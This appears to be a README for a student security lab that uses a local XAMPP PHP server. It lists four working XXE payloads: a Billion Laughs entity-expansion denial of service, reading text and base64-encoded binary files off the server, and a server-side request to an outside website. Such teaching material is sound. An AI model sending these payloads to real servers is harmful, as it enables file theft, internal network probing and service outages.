Run the php file in a XAMPP instance. Then issue queries to the server with these XMLs included (only one XML per query, so one example per query), e.g. with Postman.

These examples are intented to be performed live and by the fellow students.

1st task: Billion Laughs attack:

```
<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar "World ">
  <!ENTITY t1 "&bar;&bar;&bar;&bar;&bar;&bar;">
  <!ENTITY t2 "&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;&t1;">
  <!ENTITY t3 "&t2;&t2;&t2;&t2;&t2;">
]>
<creds>
  <user>Hello &t2;</user>
  <pass>mypass</pass>
</creds>
```

2nd task: Retrieve a non-binary file from the server's machine:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///[ABSOLUTE PATH TO THE FILE]" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

3rd task: Retrieve a binary file from the server's machine (Base64 encoded):
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM
  "php://filter/read=convert.base64-encode/resource=file:///[ABSOLUTE PATH TO THE FILE]">
]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

4th task: Get the result of a request made by the server to a website (Base64 encoded):
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM
  "php://filter/read=convert.base64-encode/resource=http://google.de/">
]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```
